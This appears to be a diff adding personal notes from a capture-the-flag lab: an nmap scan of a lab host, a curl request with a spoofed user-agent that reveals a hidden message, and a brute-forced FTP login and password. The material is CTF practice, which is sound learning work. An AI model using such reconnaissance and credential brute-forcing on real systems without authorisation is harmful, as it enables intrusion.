@@ -1,0 +1,33 @@
+nmap results 
+nmap 10.10.134.122
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-06 14:29 IST
+Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 48.18% done; ETC: 14:30 (0:00:13 remaining)
+Nmap scan report for 10.10.134.122
+Host is up (0.27s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 25.44 seconds
+
+ curl "http://10.10.136.138" -H "user-agent:C" -L
+Attention chris, <br><br>
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>
+
+From,<br>
+Agent R 
+
+
+
+
+
+[21][ftp] host: 10.10.134.122   login: chris   password: crystal
+
+
+
+
+
